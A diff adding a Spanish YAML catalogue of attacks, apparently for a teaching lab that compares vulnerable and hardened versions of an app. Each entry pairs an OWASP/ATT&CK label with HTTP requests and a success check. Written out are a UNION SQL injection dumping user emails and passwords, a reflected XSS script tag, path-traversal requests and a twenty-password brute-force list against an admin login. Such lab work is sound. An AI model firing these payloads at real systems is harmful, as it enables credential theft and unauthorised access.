@@ -1,0 +1,62 @@
+# Catálogo de ataques. Cada uno lleva su prueba objetiva de éxito ("exito"):
+#   contiene: alguna respuesta trae ese texto      estado: alguna respuesta tiene ese código
+# Las rutas son relativas al objetivo; el lanzador antepone el modo (/vulnerable o /endurecida).
+- id: inyeccion-sql
+  nombre: Inyección SQL
+  descripcion: La búsqueda arma el SQL pegando el texto del visitante. Con UNION se le añade una segunda consulta que devuelve la tabla de usuarios.
+  owasp: "A03:2021 Inyección"
+  attack: T1190
+  funcion: buscar
+  peticiones:
+    - {metodo: GET, ruta: /buscar, params: {q: "' UNION SELECT email, clave FROM usuarios --"}}
+  exito: {contiene: "admin@lab.invalid"}
+
+- id: xss-reflejado
+  nombre: XSS reflejado
+  descripcion: La página devuelve el término buscado sin escapar. Si es una etiqueta script, el navegador de la víctima la ejecutaría.
+  owasp: "A03:2021 Inyección"
+  attack: T1059.007
+  funcion: buscar
+  peticiones:
+    - {metodo: GET, ruta: /buscar, params: {q: "<script>alert(1)</script>"}}
+  exito: {contiene: "<script>alert(1)</script>"}
+
+- id: recorrido-rutas
+  nombre: Recorrido de rutas
+  descripcion: La descarga une el nombre pedido a la carpeta pública sin comprobar dónde termina. Con ../ se sale de ella y lee un archivo que no debía servirse.
+  owasp: "A01:2021 Pérdida de control de acceso"
+  attack: T1190
+  funcion: archivo
+  peticiones:
+    - {metodo: GET, ruta: /archivo, params: {nombre: "../secreto.txt"}}
+    - {metodo: GET, ruta: /archivo, params: {nombre: "publico/../../secreto.txt"}}
+  exito: {contiene: "SENUELO-LAB-7f3a"}
+
+- id: fuerza-bruta
+  nombre: Fuerza bruta de login
+  descripcion: Veinte contraseñas comunes contra la cuenta admin, una tras otra. Sin límite de intentos, alguna acaba entrando.
+  owasp: "A07:2021 Fallos de identificación y autenticación"
+  attack: T1110.001
+  funcion: login
+  peticiones:
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "123456"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "password"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "admin"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "qwerty"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "111111"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "abc123"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "letmein"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "admin123"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "iloveyou"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "monkey"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "colombia"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "dragon2024"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "futbol"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "welcome"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "sunshine"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "master"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "shadow"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "superman"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "princesa"}}
+    - {metodo: POST, ruta: /login, cuerpo: {usuario: admin, clave: "zxcvbnm"}}
+  exito: {estado: 200}
